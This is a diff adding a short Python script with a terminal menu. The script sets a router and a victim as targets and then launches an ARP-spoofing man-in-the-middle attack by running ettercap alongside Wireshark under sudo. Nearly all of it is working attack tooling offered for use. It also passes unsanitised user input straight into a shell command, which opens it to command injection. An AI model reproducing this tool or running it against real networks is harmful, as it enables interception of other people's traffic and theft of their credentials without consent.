@@ -1,0 +1,66 @@
+#!/bin/env python3
+
+from simple_term_menu import TerminalMenu
+import os
+
+def banner():
+    print("\n----------------------------------")
+    print(" ███▄ ▄███▓ ██▓▄▄▄█████▓ ███▄ ▄███▓")
+    print("▓██▒▀█▀ ██▒▓██▒▓  ██▒ ▓▒▓██▒▀█▀ ██▒")
+    print("▓██    ▓██░▒██▒▒ ▓██░ ▒░▓██    ▓██░")
+    print("▒██    ▒██ ░██░░ ▓██▓ ░ ▒██    ▒██ ")
+    print("▒██▒   ░██▒░██░  ▒██▒ ░ ▒██▒   ░██▒")
+    print("  █     █    █    █      █       █ ")
+    print("By LeCoqHardi")
+    print("\n----------------------------------")
+
+
+
+def ReturnToMenu():
+    os.system("clear")
+    banner()
+    options = ["Set Target 1", "Set Target 2", "!! Attack !!", "Exit"]
+    terminal_menu = TerminalMenu(options)
+    menu_entry_index = terminal_menu.show()
+    Output = options[menu_entry_index]
+    return Output
+
+def main():
+    target1 = "" # Target1 IP or Hostname (generally the router)
+    target2 = "" # Target2 IP or Hostname (generally the target you want to sniff)
+    while(1):
+        UserChoice = ReturnToMenu()
+# -= [TARGET 1 PART] =-
+        if (UserChoice == "Set Target 1"):
+            if(target1 == ""):
+                print("Target 1 is currently empty.")
+            elif(target1 != ""):
+                print("Current Target 1 : " + target1)
+            target1 = input("Target 1 > ")
+# -= [TARGET 2 PART] =-
+        if (UserChoice == "Set Target 2"):
+            if(target2 == ""):
+                print("Target 2 is currently empty.")
+            elif(target2 != ""):
+                print("Current Target 2 : " + target2)
+            target2 = input("Target 2 > ")
+# -= [ATTACK] =-
+        if (UserChoice == "!! Attack !!"):
+            print("Target 1 is : " + target1)
+            print("Target 2 is : " + target2)
+            print("Are you sure you want to attack ?")
+            options = ["YES I DO !!!", "No i'm a pussy..."]
+            terminal_menu = TerminalMenu(options)
+            menu_entry_index = terminal_menu.show()
+            verif = options[menu_entry_index]
+            if(verif == "YES I DO !!!"):
+                print("Launching Man in the Middle Attack...")
+                os.system("sudo wireshark & sudo ettercap -T -S -M arp:remote /" + target1 + "// /" + target2+ "//")
+            elif(verif == "No i'm a pussy..."):
+                print("")
+# -= [EXIT SCRIPT] =-
+        if (UserChoice == "Exit"):
+            quit()
+
+if __name__ == "__main__":
+    main()
